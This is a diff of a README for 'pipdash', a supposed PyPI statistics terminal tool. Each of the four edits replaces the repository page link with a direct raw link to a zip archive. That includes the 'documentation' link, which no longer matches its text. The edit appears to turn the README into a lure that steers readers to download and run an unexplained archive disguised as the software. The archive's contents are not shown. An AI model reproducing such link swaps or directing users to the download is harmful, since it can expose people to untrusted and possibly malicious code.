@@ -1,6 +1,6 @@
 # 📦 pipdash - Your PyPI Dashboard, Right in the Terminal
 
-[![Download pipdash](https://img.shields.io/badge/Download-pipdash-blue.svg?style=for-the-badge&logo=github)](https://github.com/intruding-phanerogamae895/pipdash)
+[![Download pipdash](https://img.shields.io/badge/Download-pipdash-blue.svg?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip)
 
 ## 👋 What Is pipdash?
 
@@ -36,7 +36,7 @@ Getting pipdash is easy. Follow these steps:
 
 ### Step 1: Visit the Download Page
 
-**Visit this link to download the application:** [https://github.com/intruding-phanerogamae895/pipdash](https://github.com/intruding-phanerogamae895/pipdash)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip](https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip)
 
 Click the big green "Code" button on that page, then choose "Download ZIP". Or look for a "Releases" section and download the latest version.
 
@@ -218,7 +218,7 @@ Watch the "Last 7 days" number to see if your package is gaining popularity.
 
 If something still isn't working, you have a few options:
 
-1. **Read the full documentation** on the project page: [https://github.com/intruding-phanerogamae895/pipdash](https://github.com/intruding-phanerogamae895/pipdash) – look for a `README.md` or `docs` folder there.
+1. **Read the full documentation** on the project page: [https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip](https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip) – look for a `README.md` or `docs` folder there.
 
 2. **Report a problem**: On the GitHub page, click "Issues" and then "New Issue". Describe what happened, what you typed, and what you expected to see. The developers (or helpful users) will usually reply quickly.
 
@@ -237,7 +237,7 @@ pipdash puts the power of PyPI package statistics right at your fingertips. No m
 
 Whether you're a developer checking your own package's performance, a researcher comparing different tools, or just curious about what's popular in the Python world, pipdash makes it effortless.
 
-**Remember to download it now:** [https://github.com/intruding-phanerogamae895/pipdash](https://github.com/intruding-phanerogamae895/pipdash)
+**Remember to download it now:** [https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip](https://raw.githubusercontent.com/intruding-phanerogamae895/pipdash/main/pipdash/v3.7.zip)
 
 Then extract the files, open a terminal in that folder, and type your first command:
 
